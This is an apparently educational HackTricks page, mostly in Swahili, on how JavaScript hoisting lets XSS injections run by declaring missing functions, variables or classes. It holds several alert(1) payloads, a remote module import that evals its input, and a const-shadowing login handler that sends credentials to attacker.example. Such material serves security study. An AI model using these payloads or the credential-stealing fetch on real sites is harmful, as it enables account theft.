# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

Katika lugha ya JavaScript, kuna utaratibu unaoitwa **Hoisting** ambapo tamko za variables, functions, classes, au imports kwa dhana huinuliwa juu ya scope yao kabla ya msimbo kutekelezwa. Mchakato huu hufanywa kiotomatiki na JavaScript engine, ambayo hupitia script kwa vipindi vingi.

Wakati wa pass ya kwanza, engine inachambua msimbo kuangalia syntax errors na kuubadilisha kuwa abstract syntax tree. Awamu hii inajumuisha hoisting, mchakato ambapo tamko fulani huhamishwa hadi juu ya execution context. Ikiwa hatua ya parsing itafanikiwa, ikionyesha hakuna syntax errors, utekelezaji wa script unaendelea.

Ni muhimu kuelewa kwamba:

1. Script inapaswa kuwa haina syntax errors ili utekelezaji uanze. Sheria za syntax lazima zizingatiwe kikamilifu.
2. Nafasi ya msimbo ndani ya script inaathiri utekelezaji kutokana na hoisting, ingawa msimbo unaotekelezwa unaweza kutofautiana na muundo wake wa maandishi.

#### Types of Hoisting

Kulingana na MDN, kuna aina nne tofauti za hoisting katika JavaScript:

1. **Value Hoisting**: Inaruhusu matumizi ya thamani ya variable ndani ya scope yake kabla ya mstari wake wa declaration.
2. **Declaration Hoisting**: Inaruhusu kurejelea variable ndani ya scope kabla ya declaration yake bila kusababisha `ReferenceError`, lakini thamani ya variable itakuwa `undefined`.
3. Aina hii inabadilisha tabia ndani ya scope kutokana na tamko la variable kabla ya mstari wake halisi wa declaration.
4. Madhara ya tamko yanatokea kabla ya sehemu nyingine za msimbo zinazojumuisha tamko hilo kuangaliwa.

Kwa undani, function declarations zinaonyesha tabia ya hoisting ya aina ya 1. `var` inadhihirisha tabia ya aina ya 2. Lexical declarations, ambazo ni pamoja na `let`, `const`, na `class`, zinaonyesha tabia ya aina ya 3. Mwishowe, statements za `import` ni za kipekee kwa kuwa zinahoisted kwa tabia za aina ya 1 na aina ya 4.

## Scenarios

Kwa hiyo ikiwa una matukio ambapo unaweza **Inject JS code after an undeclared object** inatumiwa, unaweza **fix the syntax** kwa kuitangaza (hivyo msimbo wako unatekelezwa badala ya kutoa error):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesnÂ´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Matukio Mengine
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Zuia tamko za baadaye kwa kufunga jina kwa const

Ikiwa unaweza kutekeleza kabla ya `function foo(){...}` ya ngazi ya juu kusomwa, kutangaza lexical binding kwa jina lile lile (mf., `const foo = ...`) kutaizuia tamko la function la baadaye kuunganisha tena kitambulisho hicho. Hii inaweza kutumika vibaya katika RXSS kuchukua udhibiti wa handlers muhimu zilizofafanuliwa baadaye kwenye ukurasa:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Vidokezo
- Hii inategemea mpangilio wa utekelezaji na global (top-level) scope.
- Ikiwa payload yako inatekelezwa ndani ya `eval()`, kumbuka kwamba `const/let` ndani ya `eval` ni block-scoped na hazitaunda global bindings. Ingiza element mpya ya `<script>` yenye code ili kuanzisha `const` ya kweli ya global.

## Marejeo

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)

{{#include ../../banners/hacktricks-training.md}}
